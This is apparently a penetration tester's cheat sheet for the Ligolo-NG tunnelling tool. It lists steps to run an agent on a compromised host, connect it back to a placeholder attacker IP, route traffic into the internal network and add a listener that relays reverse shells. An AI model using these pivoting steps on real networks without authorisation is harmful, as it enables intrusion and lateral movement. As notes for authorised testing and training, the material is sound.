# Ligolo-NG

## [Download](https://github.com/nicocha30/ligolo-ng)

## Usage
* Agent Setup
  - Upload agent to compromised host
  - Execute agent
  ```bash
  # Linux
  ```
  ```powershell
  # Windows
  ```
* Attacker Machine Setup
  - Create interface for Ligolo to use
  ```bash
  sudo ip tuntap add user <username> mode tun ligolo

  sudo ip link set ligolo up

  # Verify iface added
  ip addr show ligolo
  ```
* Start Ligolo-NG
  ```bash
  proxy
  ```
* Run the agent on the pivot machine
  ```bash
  agent -connect <attacker IP:11601>
  ```
  - Should see agent joined on the attacker machine
* Select Agent on Attacker machine
  ```bash
  session
  ```
* Add route on attacker machine
  ```bash
  sudo ip route add <pivot network> dev ligolo
  # Example: sudo ip route add 10.10.11.0/24 dev ligolo
  ```
* In the proxy interface, start the tunnel
  ```bash
  start
  ```
* Setup is done, you should be able to access the proxy environment. No proxychains, etc required

### Setup to access the pivot host (Pivot host will be unavailable when ligolo is running)
* Add special route with *magic* ip address
  ```bash
  sudo ip route add 240.0.0.1/32 dev ligolo
  ```
  - accesses 127.0.0.1 on the pivot box

### Setup for reverse shell
* In the proxy shell on the attack machine, add a listener
  ```bash
  listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
  ```
  - Adds a listener on the agent machine, port 30000 and forwards to us on port 10000

